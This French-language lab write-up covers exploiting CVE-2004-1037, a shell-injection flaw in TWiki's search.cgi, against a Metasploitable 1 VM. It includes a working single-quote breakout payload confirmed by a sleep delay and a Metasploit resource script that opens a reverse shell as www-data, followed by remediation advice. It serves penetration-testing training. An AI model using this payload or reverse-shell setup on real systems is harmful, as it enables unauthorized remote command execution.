TWiki 20030201 — RCE via search.cgi

Injection de métacaractères shell dans le paramètre de recherche, confirmée par mesure de délai puis exploitée via Metasploit

Service / PortHTTP (Apache 2.2.8 / PHP 5.2.4) — port 80, appli /twiki/
CibleMetasploitable 1 — 192.168.56.102
CVECVE-2004-1037
RésultatShell distant en tant que www-data
Testé parZANNOU Josaphat
Note réseau. Cette page utilise le réseau de Josaphat (vboxnet0) : cible 192.168.56.102, Kali 192.168.56.1. Côté Jules, le même service est sur 172.28.128.4. TikiWiki et TWiki coexistent sur le port 80 : ce sont deux applications distinctes, traitées chacune dans sa propre page (voir tikiwiki.html).

1. Identification

Énumération des sous-répertoires du port 80 pour localiser TWiki et sa version exacte, à partir du fichier d'historique embarqué dans la distribution.

$ for u in "twiki/" "twiki/bin/view" "twiki/bin/search" "twiki/TWikiHistory.html"; do
  curl -s -o /dev/null -w "/$u -> %{http_code}\n" "http://192.168.56.102/$u"
done
/twiki/ -> 200
/twiki/bin/view -> 200
/twiki/bin/search -> 200
/twiki/TWikiHistory.html -> 200
$ curl -s "http://192.168.56.102/twiki/TWikiHistory.html" | grep -oE '[0-9]{2} [A-Z][a-z]{2} 20[0-9]{2}' | head -2
18 Jan 2003

TWiki est présent, bin/search répond, et la date embarquée confirme le build TWiki 20030201 (nommage TWiki = date de release).

2. Méthode d'identification de la CVE et du module

$ searchsploit twiki
TWiki 20030201 - 'search.pm' Remote Command E...  | cgi/webapps/642.pl

$ msfconsole -q -x "info exploit/unix/webapp/twiki_search; exit"
Name: TWiki Search Function Arbitrary Command Execution
References:
  https://nvd.nist.gov/vuln/detail/CVE-2004-1037

→ CVE-2004-1037 confirmée.

Mécanisme. Le script search.cgi construit une commande shell à partir du paramètre search fourni par l'utilisateur (recherche texte dans les topics via grep), sans l'échapper correctement. En cassant la chaîne de guillemets de la commande construite, on injecte ses propres métacaractères shell (;, |, `) pour exécuter des commandes arbitraires, avec les droits du serveur web.

3. Démarche d'exploitation

a) Confirmation manuelle par mesure de délai. La sortie des commandes n'est pas réaffichée dans la page HTML de résultat (juste Number of topics: N), donc on confirme l'exécution par un délai mesurable plutôt que par la sortie texte :

# recherche normale : ~0.13s
$ curl -s -o /dev/null -w "%{time_total}s\n" -G "http://192.168.56.102/twiki/bin/search/Main/SearchResult" \
  --data-urlencode "search=test"
0.126485s

# breakout simple-quote + sleep 5 (espace -> ${IFS}, interdit ici)
$ curl -s -o /dev/null -w "%{time_total}s\n" -G "http://192.168.56.102/twiki/bin/search/Main/SearchResult" \
  --data-urlencode 'search=a'"'"';sleep${IFS}5;#'"'"''
5.138759s

Le passage de 0.13s à 5.14s confirme l'exécution de la commande injectée. Testé aussi en breakout double-quote : échec (retour en 0.15s) — seul le breakout simple quote fonctionne.

b) Limite de la tentative manuelle. Essai d'écrire la sortie de id dans le webroot pour la relire en HTTP : échec (404), chemin filesystem du processus CGI inconnu. Reconstituer un reverse shell manuel à l'aveugle aurait demandé de deviner ce chemin — hors du temps raisonnable du labo. Passage au module Metasploit dédié, qui gère déjà ces spécificités (écriture d'un fichier de test via tee, vérification via bin/view/Main/<fichier>).

$ cat > /tmp/twiki.rc << 'EOF'
use exploit/unix/webapp/twiki_search
set RHOSTS 192.168.56.102
set PAYLOAD cmd/unix/reverse
set LHOST 192.168.56.1
set LPORT 4445
exploit -z
sessions -i 1 -c id
EOF
$ msfconsole -q -r /tmp/twiki.rc
[*] Attempting to delete: /twiki/bin/view/Main/ENi4OU0U
[+] The target is vulnerable. The target is vulnerable
[*] Command shell session 1 opened (192.168.56.1:4445 -> 192.168.56.102:54515)

Shell confirmé en tant que www-data. Pas root : l'élévation de privilèges sera une étape distincte.

5. Remédiation

RECOMMANDATIONS
  • Mettre à jour TWiki : le build 20030201 est très ancien ; CVE-2004-1037 est corrigée dans les versions ultérieures qui échappent correctement les entrées dans search.pm.
  • Ne jamais construire une commande shell en interpolant directement une entrée utilisateur ; préférer des appels système avec arguments séparés.
  • Appliquer le principe de moindre privilège au compte du serveur web (www-data).
  • Restreindre ou authentifier la fonctionnalité de recherche si elle n'est pas indispensable publiquement.
